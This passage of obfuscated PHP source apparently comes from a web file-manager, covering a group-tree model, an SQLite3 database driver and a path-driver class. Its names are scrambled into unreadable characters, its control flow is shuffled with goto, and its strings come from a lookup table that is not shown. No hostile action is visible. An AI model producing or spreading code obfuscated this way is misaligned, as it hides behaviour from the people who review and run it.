$A½ìËÊÆœ—, $D½İç¾„È, $bèÖé›ëä) { goto Bïë¹»ÒÍ; BÖ¶ù‚ÕøÄ: if ($bèÖé›ëä) { $Eäƒµ‹ÑÕ[$Bëç†Ï£[2098]] = array($Bëç†Ï£[17], $bèÖé›ëä); } $Eµ¤³Œ±Úî = Model($Bëç†Ï£[2184])->where($Eäƒµ‹ÑÕ)->limit($D½İç¾„È)->select(); if (!$Eµ¤³Œ±Úî) { return array(); } goto d¯³ê×È¸ƒ; d¯³ê×È¸ƒ: $Eµ¤³Œ±Úî = array_to_keyvalue($Eµ¤³Œ±Úî, $Bëç†Ï£[43], $Bëç†Ï£[2098]); $f›Æ©†ª = $this->where(array($Bëç†Ï£[2175] => array($Bëç†Ï£[17], $Eµ¤³Œ±Úî)))->select(); if (!$f›Æ©†ª) { return array(); } goto Dã·ã¦Şøì; Bïë¹»ÒÍ: $Bëç†Ï£ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A½ìËÊÆœ— = strtolower($A½ìËÊÆœ—); $Eäƒµ‹ÑÕ = array($Bëç†Ï£[101] => $b¸õìó¦, $Bëç†Ï£[370] => array($Bëç†Ï£[746], "\45{$A½ìËÊÆœ—}\45")); goto BÖ¶ù‚ÕøÄ; Dã·ã¦Şøì: return $f›Æ©†ª; goto e© éôÚ; e© éôÚ: } protected function _listDataApplyItem($aÙ§ë‘ì¢Û) { $a †İ¼ö¤ = array($aÙ§ë‘ì¢Û); $this->_listDataApply($a †İ¼ö¤); return $a †İ¼ö¤[0]; } protected function _listDataApply(&$F‰¬”Ä‡×) { goto aÉ¸µ¡š×; aÉ¸µ¡š×: $f«äœ—èÏŸ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$F‰¬”Ä‡×) { return; } $a‰ŞöíÌŠç = array_to_keyvalue($F‰¬”Ä‡×, $f«äœ—èÏŸ[43], $f«äœ—èÏŸ[2098]); goto EÀáâÙµÇ; EÀáâÙµÇ: $this->_listAppendChildren($F‰¬”Ä‡×); $this->_listAppendChildrenMember($F‰¬”Ä‡×); $this->_listAppendMeta($F‰¬”Ä‡×, $a‰ŞöíÌŠç); goto B’…¯òğ‚Á; B’…¯òğ‚Á: $this->_listAppendParent($F‰¬”Ä‡×); $this->_listAppendSourceRoot($F‰¬”Ä‡×, $a‰ŞöíÌŠç); goto b„¶¿Ò…˜Ğ; b„¶¿Ò…˜Ğ: } private function _listAppendChildren(&$B“¶³Íãî£) { goto bª»‹‹ÑŠÈ; DèäéÅ÷„Ë: $dùŒ‘®Ÿ = count($B“¶³Íãî£); $f“®¯á£²š = $this->tablePrefix . $this->tableName; for ($eºÀœˆìÊ = 0, $bÓ¨êÓ“‚˜ = 0; $eºÀœˆìÊ < $dùŒ‘®Ÿ; $eºÀœˆìÊ++) { $bÓ¨êÓ“‚˜++; $eó›è‚ÁŠ = $B“¶³Íãî£[$eºÀœˆìÊ][$EĞ„ä†Èºº[2098]]; $B¥ªã…ÓĞæ .= "\123\x45\x4c\105\x43\124\40\52\40\x46\122\117\115\x20\50\x53\x45\114\x45\103\124\40\x27{$eó›è‚ÁŠ}\137\x63\x68\x69\x6c\x64\x27\40\x61\x73\40\150\141\x73\x20\106\x52\x4f\x4d\x20\x60{$f“®¯á£²š}\140\x20\x77\150\x65\162\x65\40\x70\x61\x72\145\x6e\164\111\104\x3d{$eó›è‚ÁŠ}\x20\x6c\151\155\151\x74\x20\x31\x29\x20\141\x73\40\164\x62\x5f{$eó›è‚ÁŠ}\x20\x75\156\151\157\x6e\40\x61\154\x6c\x20"; if (($bÓ¨êÓ“‚˜ >= 20 || $eºÀœˆìÊ == $dùŒ‘®Ÿ - 1) && $B¥ªã…ÓĞæ) { $B¥ªã…ÓĞæ = substr($B¥ªã…ÓĞæ, 0, -strlen($EĞ„ä†Èºº[462])); $A„Åùºš  = $this->query($B¥ªã…ÓĞæ); $c¤Ìµ¤„‰µ = array_merge($c¤Ìµ¤„‰µ, $A„Åùºš ); $bÓ¨êÓ“‚˜ = 0; $B¥ªã…ÓĞæ = $EĞ„ä†Èºº[43]; } } goto AéòáÕˆÂÏ; AéòáÕˆÂÏ: $c¤Ìµ¤„‰µ = array_to_keyvalue($c¤Ìµ¤„‰µ, $EĞ„ä†Èºº[463]); foreach ($B“¶³Íãî£ as &$Eæ‚æ¯½•ˆ) { $Eæ‚æ¯½•ˆ[$EĞ„ä†Èºº[2185]] = isset($c¤Ìµ¤„‰µ[$Eæ‚æ¯½•ˆ[$EĞ„ä†Èºº[2098]] . $EĞ„ä†Èºº[2186]]); } goto A¯­Œšö¤; bª»‹‹ÑŠÈ: $EĞ„ä†Èºº =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¥ªã…ÓĞæ = $EĞ„ä†Èºº[372]; $c¤Ìµ¤„‰µ = array(); goto DèäéÅ÷„Ë; A¯­Œšö¤: } private function _listAppendChildrenMember(&$B—åç¥ˆä) { goto bğïÃïƒÛ; FèÖ­ÙÈ±: $E‰Ó„ù×¨Ÿ = count($B—åç¥ˆä); $aµß†Û¡ = $this->tablePrefix . $CÙÖ¦İÃÒ[2177]; for ($f½¶³ÏÑ  = 0, $dé›Ö«ÏèÏ = 0; $f½¶³ÏÑ  < $E‰Ó„ù×¨Ÿ; $f½¶³ÏÑ ++) { $dé›Ö«ÏèÏ++; $Fï¸õ³‚‡‹ = $B—åç¥ˆä[$f½¶³ÏÑ ][$CÙÖ¦İÃÒ[2098]]; $eÕÄà‡­ô .= "\x53\105\114\105\103\124\x20\52\40\x46\122\117\x4d\x20\x28\x53\105\114\x45\x43\x54\40\47{$Fï¸õ³‚‡‹}\x5f\143\x68\151\x6c\144\47\x20\141\163\x20\150\141\x73\x20\x46\122\x4f\115\x20\x60{$aµß†Û¡}\x60\40\167\x68\x65\162\x65\x20\x67\x72\157\x75\160\x49\104\75{$Fï¸õ³‚‡‹}\x20\154\151\155\151\164\x20\61\x29\x20\x61\x73\x20\x74\x62\137{$Fï¸õ³‚‡‹}\x20\x75\x6e\151\157\x6e\x20\x61\x6c\154\x20"; if (($dé›Ö«ÏèÏ >= 20 || $f½¶³ÏÑ  == $E‰Ó„ù×¨Ÿ - 1) && $eÕÄà‡­ô) { $eÕÄà‡­ô = substr($eÕÄà‡­ô, 0, -strlen($CÙÖ¦İÃÒ[462])); $aÕĞ†´ÎÂ» = $this->query($eÕÄà‡­ô); $D¡îõÁì´Ù = array_merge($D¡îõÁì´Ù, $aÕĞ†´ÎÂ»); $dé›Ö«ÏèÏ = 0; $eÕÄà‡­ô = $CÙÖ¦İÃÒ[43]; } } goto AèğÆÔÕ›»; AèğÆÔÕ›»: $D¡îõÁì´Ù = array_to_keyvalue($D¡îõÁì´Ù, $CÙÖ¦İÃÒ[463]); foreach ($B—åç¥ˆä as &$b£Ù¦ç•) { $b£Ù¦ç•[$CÙÖ¦İÃÒ[2187]] = isset($D¡îõÁì´Ù[$b£Ù¦ç•[$CÙÖ¦İÃÒ[2098]] . $CÙÖ¦İÃÒ[2186]]); } goto eîİµÂ´‘ ; bğïÃïƒÛ: $CÙÖ¦İÃÒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÕÄà‡­ô = $CÙÖ¦İÃÒ[372]; $D¡îõÁì´Ù = array(); goto FèÖ­ÙÈ±; eîİµÂ´‘ : } private function _listAppendMeta(&$E¾¶‚ŸÃÖõ, $BÆ“µöìô˜) { $F˜ÂÊÓ¶Äß =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÁ½ñ‹Å = array($F˜ÂÊÓ¶Äß[2098] => array($F˜ÂÊÓ¶Äß[17], $BÆ“µöìô˜)); $bªë†“¨÷Ô = Model($F˜ÂÊÓ¶Äß[2176])->where($bÁ½ñ‹Å)->select(); $bªë†“¨÷Ô = array_to_keyvalue_group($bªë†“¨÷Ô, $F˜ÂÊÓ¶Äß[2098]); foreach ($bªë†“¨÷Ô as &$C­Ù¨’±è) { $C­Ù¨’±è = array_to_keyvalue($C­Ù¨’±è, $F˜ÂÊÓ¶Äß[101], $F˜ÂÊÓ¶Äß[370]); } foreach ($E¾¶‚ŸÃÖõ as &$d«ÉõÎ¥ê ) { $d«ÉõÎ¥ê [$F˜ÂÊÓ¶Äß[428]] = array(); if (isset($bªë†“¨÷Ô[$d«ÉõÎ¥ê [$F˜ÂÊÓ¶Äß[2098]]])) { $d«ÉõÎ¥ê [$F˜ÂÊÓ¶Äß[428]] = $bªë†“¨÷Ô[$d«ÉõÎ¥ê [$F˜ÂÊÓ¶Äß[2098]]]; } } } protected function parentLevelArray($B‰ßí†İ„¬) { $B®‘Ü‰‘Ä =& $_SERVER[¹÷ˆ§éÒ°ú]; $B‰ßí†İ„¬ = explode($B®‘Ü‰‘Ä[57], trim($B‰ßí†İ„¬, $B®‘Ü‰‘Ä[57])); $B‰ßí†İ„¬ = array_remove_value($B‰ßí†İ„¬, $B®‘Ü‰‘Ä[481]); return $B‰ßí†İ„¬; } private function _listAppendParent(&$Bä­‘ï÷¶”) { goto C™†Ò„»Óí; aÙ²±¸¡¥: $C¡ë™â¶Îî = array(); foreach ($CØ™„²Ã¤ as $E¾³‹Ñ˜ñõ => $dìÀãì¶¯) { if (!$dìÀãì¶¯) { $C¡ë™â¶Îî[] = $E¾³‹Ñ˜ñõ; } } if ($C¡ë™â¶Îî) { $FÏßº¦Ã = array($AŠ¹ßŞ•‚[2175] => array($AŠ¹ßŞ•‚[395], $C¡ë™â¶Îî)); $A†İ¢Ê„‰¦ = $this->field($AŠ¹ßŞ•‚[2188])->where($FÏßº¦Ã)->select(); $cƒ×…‚öğæ = array_to_keyvalue($A†İ¢Ê„‰¦, $AŠ¹ßŞ•‚[2098], $AŠ¹ßŞ•‚[38]); $CØ™„²Ã¤ = array_merge_index($CØ™„²Ã¤, $cƒ×…‚öğæ); } goto f¦‰ÁÜ‰Êƒ; C™†Ò„»Óí: $AŠ¹ßŞ•‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CØ™„²Ã¤ = array(); foreach ($Bä­‘ï÷¶” as &$dğÕ‡¨¦†) { $CØ™„²Ã¤[$dğÕ‡¨¦†[$AŠ¹ßŞ•‚[2098]]] = $dğÕ‡¨¦†[$AŠ¹ßŞ•‚[38]]; $cºŠ‹‘¿±Õ = $this->parentLevelArray($dğÕ‡¨¦†[$AŠ¹ßŞ•‚[472]]); foreach ($cºŠ‹‘¿±Õ as $a†Ÿ´‚ŒÁ¹) { if (!isset($CØ™„²Ã¤[$a†Ÿ´‚ŒÁ¹])) { $CØ™„²Ã¤[$a†Ÿ´‚ŒÁ¹] = 0; } } } goto aÙ²±¸¡¥; f¦‰ÁÜ‰Êƒ: $CøÅø½½ = $GLOBALS[$AŠ¹ßŞ•‚[16]][$AŠ¹ßŞ•‚[96]][$AŠ¹ßŞ•‚[2189]]; foreach ($Bä­‘ï÷¶” as &$dğÕ‡¨¦†) { $cºŠ‹‘¿±Õ = $this->parentLevelArray($dğÕ‡¨¦†[$AŠ¹ßŞ•‚[472]]); $Eºµ›Š‰Å§ = $AŠ¹ßŞ•‚[43]; foreach ($cºŠ‹‘¿±Õ as $E¾³‹Ñ˜ñõ => $a†Ÿ´‚ŒÁ¹) { if ($CøÅø½½ && $E¾³‹Ñ˜ñõ == 0) { continue; } $Eºµ›Š‰Å§ .= $CØ™„²Ã¤[$a†Ÿ´‚ŒÁ¹] . $AŠ¹ßŞ•‚[18]; } if ($cºŠ‹‘¿±Õ) { $Eºµ›Š‰Å§ .= $dğÕ‡¨¦†[$AŠ¹ßŞ•‚[38]]; } $dğÕ‡¨¦†[$AŠ¹ßŞ•‚[476]] = str_replace($AŠ¹ßŞ•‚[480], $AŠ¹ßŞ•‚[18], $Eºµ›Š‰Å§); } goto a”ÆÑ¨Èâ–; a”ÆÑ¨Èâ–: } private function _listAppendSourceRoot(&$aäÆ ù±¾, $Dƒªºê±¨Ş) { goto CËİî¦ŠåÚ; fìÑôçŸ™î: $AòëÂ©Ğ„Û = Model($D÷‰öŒÒ–´[747])->order($D÷‰öŒÒ–´[2191])->field($FàÒğº¨Æ)->where($D“ŸèäĞ±Ô)->select(); $AòëÂ©Ğ„Û = array_to_keyvalue($AòëÂ©Ğ„Û, $D÷‰öŒÒ–´[469]); $AòëÂ©Ğ„Û = array_remove_key($AòëÂ©Ğ„Û, $D÷‰öŒÒ–´[469]); goto bÍÔÙ¥ÀÊä; CËİî¦ŠåÚ: $D÷‰öŒÒ–´ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D“ŸèäĞ±Ô = array($D÷‰öŒÒ–´[382] => SourceModel::TYPE_GROUP, $D÷‰öŒÒ–´[474] => 0, $D÷‰öŒÒ–´[469] => array($D÷‰öŒÒ–´[17], $Dƒªºê±¨Ş)); $FàÒğº¨Æ = $D÷‰öŒÒ–´[2190]; goto fìÑôçŸ™î; bÍÔÙ¥ÀÊä: foreach ($aäÆ ù±¾ as &$b¾âÒº¹¶×) { $b¾âÒº¹¶×[$D÷‰öŒÒ–´[402]] = $AòëÂ©Ğ„Û[$b¾âÒº¹¶×[$D÷‰öŒÒ–´[2098]]] ? $AòëÂ©Ğ„Û[$b¾âÒº¹¶×[$D÷‰öŒÒ–´[2098]]] : array(); } goto aÍŠµÓ†Ë£; aÍŠµÓ†Ë£: } protected function groupMerge($CùŸº´Ø¥ñ) { $CùŸº´Ø¥ñ = array_values(array_unique($CùŸº´Ø¥ñ)); $Aö¤ƒÑï² = array(); for ($f‹ˆå¡Æô‰ = 0; $f‹ˆå¡Æô‰ < count($CùŸº´Ø¥ñ); $f‹ˆå¡Æô‰++) { $cáï¼¶‘˜ = !1; for ($dØìâÜ¹‚ = 0; $dØìâÜ¹‚ < count($CùŸº´Ø¥ñ); $dØìâÜ¹‚++) { if ($f‹ˆå¡Æô‰ == $dØìâÜ¹‚) { continue; } if ($this->isParentOf($CùŸº´Ø¥ñ[$dØìâÜ¹‚], $CùŸº´Ø¥ñ[$f‹ˆå¡Æô‰])) { $cáï¼¶‘˜ = !0; break; } } if (!$cáï¼¶‘˜) { $Aö¤ƒÑï²[] = $CùŸº´Ø¥ñ[$f‹ˆå¡Æô‰]; } } return $Aö¤ƒÑï²; } protected function isParentOf($B£Ò”Ï±İ, $cƒ©ÊòìÀ¶) { goto d£’ã®ì¬¬; d£’ã®ì¬¬: $eéĞ‘àù =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$B£Ò”Ï±İ || !$cƒ©ÊòìÀ¶ || $B£Ò”Ï±İ == $cƒ©ÊòìÀ¶) { return !1; } $b¤•‘×ƒÛÓ = $this->getInfoSimple($B£Ò”Ï±İ); goto B¦­çæ´Ğ‘; b­òóíÖ¿: return !1; goto BˆØŒ’Ë ; B¦­çæ´Ğ‘: $dõ‡Éô§Ê = $this->getInfoSimple($cƒ©ÊòìÀ¶); $a‘å®ßğ¡Ş = $b¤•‘×ƒÛÓ[$eéĞ‘àù[472]] . $B£Ò”Ï±İ . $eéĞ‘àù[57]; if (substr($dõ‡Éô§Ê[$eéĞ‘àù[472]], 0, strlen($a‘å®ßğ¡Ş)) == $a‘å®ßğ¡Ş) { return !0; } goto b­òóíÖ¿; BˆØŒ’Ë : } public function groupShowRoot($B¬‘ó˜¦“¯, $c×­‡ÔÖà = false) { goto f­éœ‰ØÜ; c‰ÛœàÈ¯à: $AøŠøĞäˆº = array($B¬‘ó˜¦“¯); if (count($dÙØğ÷®Û‹) == 0) { return $AøŠøĞäˆº; } if ($c×­‡ÔÖà && count($dÙØğ÷®Û‹) == 1) { return $AøŠøĞäˆº; } goto Bƒœâ…Ş¨Ş; f­éœ‰ØÜ: $AÎ”ŞàìŸƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bè“´Ùàò¬ = $this->getInfo($B¬‘ó˜¦“¯); $dÙØğ÷®Û‹ = $this->parentLevelArray($Bè“´Ùàò¬[$AÎ”ŞàìŸƒ[472]]); goto c‰ÛœàÈ¯à; Bƒœâ…Ş¨Ş: if (!$Bè“´Ùàò¬[$AÎ”ŞàìŸƒ[428]] || !isset($Bè“´Ùàò¬[$AÎ”ŞàìŸƒ[428]][$AÎ”ŞàìŸƒ[2173]]) || $Bè“´Ùàò¬[$AÎ”ŞàìŸƒ[428]][$AÎ”ŞàìŸƒ[2173]] == $AÎ”ŞàìŸƒ[2146]) { return $this->groupShowRoot($dÙØğ÷®Û‹[count($dÙØğ÷®Û‹) - 1], $c×­‡ÔÖà); } if ($Bè“´Ùàò¬[$AÎ”ŞàìŸƒ[428]][$AÎ”ŞàìŸƒ[2173]] == $AÎ”ŞàìŸƒ[357]) { $Cš˜ï¡æÖ® = explode($AÎ”ŞàìŸƒ[57], $Bè“´Ùàò¬[$AÎ”ŞàìŸƒ[428]][$AÎ”ŞàìŸƒ[2174]]); if ($Cš˜ï¡æÖ®) { $AøŠøĞäˆº = array_merge($AøŠøĞäˆº, $Cš˜ï¡æÖ®); } } return $AøŠøĞäˆº; goto dµ”½§Ó¶Ù; dµ”½§Ó¶Ù: } protected function resetParentLevel() { $d× ›ãµ’á =& $_SERVER[¹÷ˆ§éÒ°ú]; $D²´‘ºùë´ = $d× ›ãµ’á[2098]; $A¸±Ûµ©Ö­ = $this->select(); $A¸±Ûµ©Ö­ = array_to_keyvalue($A¸±Ûµ©Ö­, $D²´‘ºùë´); foreach ($A¸±Ûµ©Ö­ as $B½¬¹¦º) { goto eÄêÑ²»’; eÄêÑ²»’: $C¶©İÓŸ…Ï = $B½¬¹¦º; $E—áÛÃïœ– = array(); while ($C¶©İÓŸ…Ï[$d× ›ãµ’á[474]] != 0) { $E—áÛÃïœ–[] = $C¶©İÓŸ…Ï[$d× ›ãµ’á[474]]; $C¶©İÓŸ…Ï = $A¸±Ûµ©Ö­[$C¶©İÓŸ…Ï[$d× ›ãµ’á[474]]]; } goto c¤øØæîÂÁ; cÙ¡İ­ŒÁã: $this->where(array($D²´‘ºùë´ => $B½¬¹¦º[$D²´‘ºùë´]))->save(array($d× ›ãµ’á[538] => $E—áÛÃïœ–)); goto EÙ‚ÍçõË; c¤øØæîÂÁ: $E—áÛÃïœ–[] = 0; $E—áÛÃïœ– = $d× ›ãµ’á[57] . implode($d× ›ãµ’á[57], array_reverse($E—áÛÃïœ–)) . $d× ›ãµ’á[57]; $this->setNamePinyin($B½¬¹¦º[$D²´‘ºùë´], $B½¬¹¦º[$d× ›ãµ’á[38]]); goto cÙ¡İ­ŒÁã; EÙ‚ÍçõË: } return $A¸±Ûµ©Ö­; } public function groupNameAuto($D˜Ù°™Ùñ…, $bëÎ„…÷®Œ) { $DŠÉ¾µÁÏ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F­ÛÀ³É’ = $this->where(array($DŠÉ¾µÁÏ[379] => $D˜Ù°™Ùñ…))->getField($DŠÉ¾µÁÏ[38], !0); if (!$F­ÛÀ³É’ || !in_array($bëÎ„…÷®Œ, $F­ÛÀ³É’)) { return $bëÎ„…÷®Œ; } for ($B®‘ôºÁµ— = 1; $B®‘ôºÁµ— <= count($F­ÛÀ³É’) + 1; $B®‘ôºÁµ—++) { $aˆù†ğ„ç = $bëÎ„…÷®Œ . "\50{$B®‘ôºÁµ—}\x29"; if (!in_array($aˆù†ğ„ç, $F­ÛÀ³É’)) { return $aˆù†ğ„ç; } } } } goto c…ïè™®Œ; DàåÒŸ¬ÕŞ: class DbSqlite3Base extends Db { public function __construct($C‡ƒ·‡‡Ì• = '') { $C‰İ¨¼ƒó =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!class_exists($C‰İ¨¼ƒó[63])) { think_exception(think_lang($C‰İ¨¼ƒó[20]) . $C‰İ¨¼ƒó[64]); } if (!empty($C‡ƒ·‡‡Ì•)) { if (!isset($C‡ƒ·‡‡Ì•[$C‰İ¨¼ƒó[22]])) { $C‡ƒ·‡‡Ì•[$C‰İ¨¼ƒó[22]] = 438; } $this->config = $C‡ƒ·‡‡Ì•; if (empty($this->config[$C‰İ¨¼ƒó[23]])) { $this->config[$C‰İ¨¼ƒó[23]] = array(); } } } public function connect($DÔäÎ“–‰È = '', $BÛÛ‡†Œè = 0) { $dŸØŞß•‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!isset($this->linkID[$BÛÛ‡†Œè])) { if (empty($DÔäÎ“–‰È)) { $DÔäÎ“–‰È = $this->config; } $this->linkID[$BÛÛ‡†Œè] = new SQLite3($DÔäÎ“–‰È[$dŸØŞß•‚[27]]); if (!$this->linkID[$BÛÛ‡†Œè]) { think_exception($this->linkID[$BÛÛ‡†Œè]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$BÛÛ‡†Œè]->busyTimeout(30000); if (1 != think_config($dŸØŞß•‚[28])) { unset($this->config); } } return $this->linkID[$BÛÛ‡†Œè]; } public function free() { $this->queryID = null; } public function query($f“‰ˆÆº–‚) { goto eæ„¨Èùö; A‹íÙŠÒ³È: think_status($fŠ‡Ì˜ŠæŸ[30]); $this->queryID = $this->_linkID->query($f“‰ˆÆº–‚); $this->debug(); goto b‚ÛÉ¹¼õ¡; b‚ÛÉ¹¼õ¡: if (!1 === $this->queryID) { $this->error(); return !1; } else { $eÁ†¸¹ŠœÇ = $this->getAll(); $this->numRows = count($eÁ†¸¹ŠœÇ); return $eÁ†¸¹ŠœÇ; } goto bß•íÃóŠ¿; Eª‚½¢Ô¡á: $this->queryStr = $f“‰ˆÆº–‚; if ($this->queryID) { $this->free(); } think_action_status($fŠ‡Ì˜ŠæŸ[29], 1); goto A‹íÙŠÒ³È; eæ„¨Èùö: $fŠ‡Ì˜ŠæŸ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Eª‚½¢Ô¡á; bß•íÃóŠ¿: } public function execute($BâÅŒ—Œ¹†) { goto F×íÌƒõï¾; dêãŞŠ»°Œ: think_status($e¥Û¡ÒÕÚÃ[30]); $EËØÆêÁˆ‘ = $this->_linkID->exec($BâÅŒ—Œ¹†); $this->debug(); goto a‹„³›× Á; a‹„³›× Á: if (!1 === $EËØÆêÁˆ‘) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto eÍ±èæ²Ô; E¤Êî”øŸ: $this->queryStr = $BâÅŒ—Œ¹†; if ($this->queryID) { $this->free(); } think_action_status($e¥Û¡ÒÕÚÃ[31], 1); goto dêãŞŠ»°Œ; F×íÌƒõï¾: $e¥Û¡ÒÕÚÃ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E¤Êî”øŸ; eÍ±èæ²Ô: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¹÷ˆ§éÒ°ú][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F²®Ñ ·æø = $this->_linkID->query($_SERVER[¹÷ˆ§éÒ°ú][33]); if (!$F²®Ñ ·æø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $b½‡ã¬‹ëˆ = $this->_linkID->query($_SERVER[¹÷ˆ§éÒ°ú][34]); if (!$b½‡ã¬‹ëˆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $d†Ô£ğ‘ÄÁ = array(); while ($cö¸ĞõíÒ¿ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $d†Ô£ğ‘ÄÁ[] = $cö¸ĞõíÒ¿; } $this->queryID->reset(); return $d†Ô£ğ‘ÄÁ; } public function getFields($AÔÔÀ¿º¸õ) { $a‹˜ò¬ƒ¶ì =& $_SERVER[¹÷ˆ§éÒ°ú]; $E¡éİ“ÅÍ’ = $this->query($a‹˜ò¬ƒ¶ì[35] . $AÔÔÀ¿º¸õ . $a‹˜ò¬ƒ¶ì[36]); $B†¥“àË¢æ = array(); if ($E¡éİ“ÅÍ’) { foreach ($E¡éİ“ÅÍ’ as $CøÌ¥èÔ½µ => $Dä”åæÓ¾†) { $B†¥“àË¢æ[$Dä”åæÓ¾†[$a‹˜ò¬ƒ¶ì[38]]] = array($a‹˜ò¬ƒ¶ì[38] => $Dä”åæÓ¾†[$a‹˜ò¬ƒ¶ì[38]], $a‹˜ò¬ƒ¶ì[39] => $Dä”åæÓ¾†[$a‹˜ò¬ƒ¶ì[39]], $a‹˜ò¬ƒ¶ì[41] => (bool) ($Dä”åæÓ¾†[$a‹˜ò¬ƒ¶ì[41]] === $a‹˜ò¬ƒ¶ì[43]), $a‹˜ò¬ƒ¶ì[44] => $Dä”åæÓ¾†[$a‹˜ò¬ƒ¶ì[65]], $a‹˜ò¬ƒ¶ì[46] => (bool) $Dä”åæÓ¾†[$a‹˜ò¬ƒ¶ì[66]], $a‹˜ò¬ƒ¶ì[49] => (bool) $Dä”åæÓ¾†[$a‹˜ò¬ƒ¶ì[66]]); } } return $B†¥“àË¢æ; } public function getTables($fùöæó«İÅ = '') { $bé¼‰ï–«‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c¼êÏòéÌø = $this->query($bé¼‰ï–«‡[52] . $bé¼‰ï–«‡[53] . $bé¼‰ï–«‡[54]); $cƒê†Ä¨àÂ = array(); foreach ($c¼êÏòéÌø as $dÍ†Š¡œòÏ => $EŒÌ§ÇÚÜ–) { $cƒê†Ä¨àÂ[$dÍ†Š¡œòÏ] = current($EŒÌ§ÇÚÜ–); } return $cƒê†Ä¨àÂ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $A±Ïæ£Ê×ƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->error = $this->_linkID->lastErrorMsg(); if ($A±Ïæ£Ê×ƒ[43] != $this->queryStr) { $this->error .= LNG($A±Ïæ£Ê×ƒ[55]) . $this->queryStr; } think_trace($this->error, $A±Ïæ£Ê×ƒ[43], $A±Ïæ£Ê×ƒ[56]); return $this->error; } public function escapeString($Añğ·®) { $E™Ÿõ‹æ á =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->_linkID) { return $this->_linkID->escapeString($Añğ·®); } return str_ireplace($E™Ÿõ‹æ á[67], $E™Ÿõ‹æ á[68], $Añğ·®); } public function parseLimit($BÍ¨ç•æ¹¿) { $aŠ¥Ç×³ší =& $_SERVER[¹÷ˆ§éÒ°ú]; $fš“òƒŠÍ = $aŠ¥Ç×³ší[43]; if (!empty($BÍ¨ç•æ¹¿)) { $BÍ¨ç•æ¹¿ = explode($aŠ¥Ç×³ší[57], $BÍ¨ç•æ¹¿); if (count($BÍ¨ç•æ¹¿) > 1) { $fš“òƒŠÍ .= $aŠ¥Ç×³ší[58] . $BÍ¨ç•æ¹¿[1] . $aŠ¥Ç×³ší[59] . $BÍ¨ç•æ¹¿[0] . $aŠ¥Ç×³ší[60]; } else { $fš“òƒŠÍ .= $aŠ¥Ç×³ší[58] . $BÍ¨ç•æ¹¿[0] . $aŠ¥Ç×³ší[60]; } } return $fš“òƒŠÍ; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $a‘ïˆÇÔÆ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->objectDriver = array($a‘ïˆÇÔÆ[69], $a‘ïˆÇÔÆ[70], $a‘ïˆÇÔÆ[71], $a‘ïˆÇÔÆ[72], $a‘ïˆÇÔÆ[73], $a‘ïˆÇÔÆ[74], $a‘ïˆÇÔÆ[75], $a‘ïˆÇÔÆ[76]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($EÊ´Ÿ‚ª‡„) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($EÊ´Ÿ‚ª‡„, $_SERVER[¹÷ˆ§éÒ°ú][18]); } return $EÊ´Ÿ‚ª‡„; } public function getPathName($B“ÙÜ…î¢) { return $B“ÙÜ…î¢; } public function iconvApp($AÕÅ·¯ÖçÜ) { return $AÕÅ·¯ÖçÜ; } public function iconvSystem($e‹Ñ‚¾¢éé) { return $e‹Ñ‚¾¢éé; } public function iconvTo($b ““•šĞ, $c«­æ­Æ—³, $c‹ÖƒÚ‰¸¢) { goto cñ‰âĞ¾˜Ú; FÌƒÊ†Ü¬…: return $a¨«ó¨­; goto A‹ª”µ¶å°; cñ‰âĞ¾˜Ú: $eÌùÜé†˜ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$b ““•šĞ || !function_exists($eÌùÜé†˜[77])) { return $b ““•šĞ; } static $eŸÓÈ‰ÏÛŞ = array(); goto e´Ë´¿áÔ™; Dä¶©îÊáÁ: $a¨«ó¨­ = $a¨«ó¨­ ? $a¨«ó¨­ : $b ““•šĞ; if (strstr($a¨«ó¨­, $eÌùÜé†˜[81])) { $a¨«ó¨­ = str_replace($eÌùÜé†˜[81], $eÌùÜé†˜[82], $a¨«ó¨­); } $eŸÓÈ‰ÏÛŞ[$c«­æ­Æ—³ . $eÌùÜé†˜[78] . $c‹ÖƒÚ‰¸¢ . $eÌùÜé†˜[79] . $b ““•šĞ] = $a¨«ó¨­; goto aëÔ†ÖÒ†È; e´Ë´¿áÔ™: $C°ôÔº– = $c«­æ­Æ—³ . $eÌùÜé†˜[78] . $c‹ÖƒÚ‰¸¢ . $eÌùÜé†˜[79] . $b ““•šĞ; if (isset($eŸÓÈ‰ÏÛŞ[$C°ôÔº–])) { return $eŸÓÈ‰ÏÛŞ[$C°ôÔº–]; } if (function_exists($eÌùÜé†˜[80])) { $a¨«ó¨­ = @mb_convert_encoding($b ““•šĞ, $c‹ÖƒÚ‰¸¢, $c«­æ­Æ—³); } else { $a¨«ó¨­ = @iconv($c«­æ­Æ—³, $c‹ÖƒÚ‰¸¢, $b 